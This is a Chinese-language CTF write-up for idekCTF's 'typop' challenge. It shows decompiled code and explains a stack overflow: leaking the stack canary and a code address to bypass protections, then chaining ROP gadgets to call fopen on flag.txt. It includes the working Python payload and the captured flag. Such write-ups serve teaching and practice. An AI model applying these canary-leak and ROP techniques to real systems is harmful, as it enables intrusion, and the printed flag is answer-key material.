# 题目信息

JW#9396

While writing the feedback form for idekCTF, JW made a small typo. It still compiled though, so what could possibly go wrong?

nc typop.chal.idek.team 1337

# 解决方案

首先Ghidra获取源码，发现三个关键函数main、getFeedback、win，代码如下：

```c
undefined8 main(void)

{
  int iVar1;
  
  setvbuf(stdout,(char *)0x0,2,0);
  while( true ) {
    iVar1 = puts("Do you want to complete a survey?");
    if (iVar1 == 0) {
      return 0;
    }
    iVar1 = getchar();
    if (iVar1 != 0x79) break;
    getchar();
    getFeedback();
  }
  return 0;
}

void getFeedback(void)

{
  long in_FS_OFFSET;
  undefined8 local_1a;
  undefined2 local_12;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_1a = 0;
  local_12 = 0;
  puts("Do you like ctf?");
  read(0,&local_1a,0x1e);
  printf("You said: %s\n",&local_1a);
  if ((char)local_1a == 'y') {
    printf("That\'s great! ");
  }
  else {
    printf("Aww :( ");
  }
  puts("Can you provide some extra feedback?");
  read(0,&local_1a,0x5a);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

void win(undefined param_1,undefined param_2,undefined param_3)

{
  FILE *__stream;
  long in_FS_OFFSET;
  undefined8 local_52;
  undefined2 local_4a;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_4a = 0;
  local_52 = CONCAT17(0x74,CONCAT16(0x78,CONCAT15(0x74,CONCAT14(0x2e,CONCAT13(0x67,CONCAT12(param_3,
                                                  CONCAT11(param_2,param_1)))))));
  __stream = fopen((char *)&local_52,"r");
  if (__stream == (FILE *)0x0) {
    puts("Error opening flag file.");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  fgets((char *)&local_48,0x20,__stream);
  puts((char *)&local_48);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

```

getFeedback的read调用存在栈溢出，但是这个程序开启了所有保护机制，所以我们需要先知道canary的值，不然无法利用栈溢出，通过gdb调试得知`local_1a`的地址偏移10个字节后就是canary的值，偏移18个字节后是返回main函数时设置的RBP的值，由于有两个read调用，第一个read调用后会输出`local_1a`处的字符串，也就是说输出的内容遇到字节0才结束，已知canary的第一个字节为0，因此我们想要返回canary的内容，我们需要通过read调用写入11个非0字节，比如10个a加一个回车，然后就可以拿到canary和rbp的值，通过rbp以及已知的偏移量，我们可以计算出`local_1a`在栈区的实际地址，然后我们在第二次read调用时重新写入正确的canary来避免程序崩溃，这时会重新回到main函数，然后重新进入getFeedback函数。

然后开始下一步，我们还需要知道程序指令部分的基地址，这样才能构造ROP，通过gdb调试我们得知`local_1a`偏移26个字节后的值为main+55对应的地址，通过第一个read调用，我们写入26个非0字符，然后就可以读取到该地址，根据偏移量算出实际的基地址，然后我们就可以构造ROP了。

通过ROPgadget发现我们只能控制rdi和rsi寄存器的值，无法控制rdx寄存器的值，因此我们不能跳到win函数，而是直接跳到fopen函数，通过控制第一个参数（即rdi）为flag.txt，第二个参数（即rsi）为r，然后跳到fopen函数，但是这个地方需要正确设置，不然会出错。

刚开始我尝试构造的payload为：

```python
payload = b'flag.txt\0\0' + canary + flat(
    0,
    pop_rdi_ret,
    stack_address,
    pop_rsi_pop_r15_ret,
    string_r,
    0,
    fopen_addr,
)
```

这个payload并不能成功，通过gdb调试，发现可以跳到fopen调用指令处，而且参数都是正确的，不知道是哪里出了问题，后来参考别人的方案，才发现问题所在。

首先，payload最后一部分写入的fopen_addr出栈到RIP寄存器中，然后开始执行fopen函数，fopen函数会有诸多入栈操作，会把前面写入flag.txt给覆盖掉，因此，执行后会显示文件打开错误，所以我们需要把flag.txt的值写入fopen_addr后面的地方防止被后续的入栈操作覆盖掉。

此外，canary后续的8个字节会出栈到RBP寄存器中，设置成0是不行的，会报错SIGSEGV错误，在构造shell gadget时不用考虑这些，但是这里的fopen函数中有很多复杂的指令，乱设一个值是不行的，我们把RBP设置为往下0x100字节，就不会报错，可以成功拿到flag的payload如下：

```python
payload = b'flag.txt\0\0' + canary + flat(
    rbp_address - 0x100,
    pop_rdi_ret,
    stack_address + 0x51,
    pop_rsi_pop_r15_ret,
    string_r,
    0,
    fopen_addr,
    b'a' * 7 + b'f',
    b'lag.txt\0'
)
```

具体细节可以参考脚本[solve.py](solution/solve.py)。

```
idek{2_guess_typos_do_matter}
```